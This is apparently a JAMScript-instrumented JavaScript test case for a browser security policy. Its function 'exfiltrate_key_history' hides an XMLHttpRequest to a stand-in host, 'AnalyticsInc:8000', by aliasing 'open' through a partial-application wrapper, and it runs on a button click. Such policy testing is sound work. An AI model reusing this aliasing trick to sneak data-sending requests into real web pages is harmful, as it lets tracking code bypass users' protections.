function exfiltrate_key_history() {
  function partial(func$$3) {
    function v0() {
      var v8 = Array.prototype;
      var v5 = v8.slice;
      var v1 = JAMScript.callIntrospect(v5.call, v5, [arguments], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
      var allArguments = JAMScript.callIntrospect(args.concat, args, [v1], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
      return JAMScript.callIntrospect(func$$3.apply, func$$3, [this, allArguments], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)
    }
    var v6 = Array.prototype;
    var v2 = v6.slice;
    var args = JAMScript.callIntrospect(v2.call, v2, [arguments, 1], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
    return v0
  }
  xmlhttp = new XMLHttpRequest;
  var v3 = xmlhttp;
  var v7 = xmlhttp.open;
  var v9 = partial(v7, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  v3.openn = v9;
  JAMScript.callIntrospect(xmlhttp.openn, xmlhttp, [], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  JAMScript.callIntrospect(xmlhttp.send, xmlhttp, [null], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  return
}
var v4 = document.getElementById("test");
JAMScript.set(v4, "onclick", exfiltrate_key_history);

